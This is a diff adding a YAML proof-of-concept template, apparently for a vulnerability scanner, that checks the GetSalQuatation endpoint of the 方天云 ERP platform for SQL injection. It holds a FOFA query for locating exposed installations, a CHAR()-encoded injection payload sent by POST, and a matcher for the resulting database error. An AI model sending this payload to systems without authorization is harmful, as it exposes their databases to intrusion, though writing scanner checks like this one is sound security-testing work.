@@ -1,0 +1,19 @@
+id: poc-yaml-ftyerp-getsalquatation-sqli
+info:
+  name: 方天云智慧平台系统 GetSalQuatation SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: ftyerp
+  fofa: body="AjaxMethods.asmx/GetCompanyItem"
+requests:
+- method: POST
+  path: /AjaxMethods.asmx/GetSalQuatation
+  headers:
+    Content-Type: application/json
+    X-Requested-With: XMLHttpRequest
+  data: '{ID:"(SELECT CHAR(113)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113))"}'
+  expression: "status_code == 500 && \ncontains(body,\"qxzpqqxzpq\") &&\ncontains(body,\"\
+    转换成数据类型 int 时失败\")\n"
+variables: {}
+transport: http
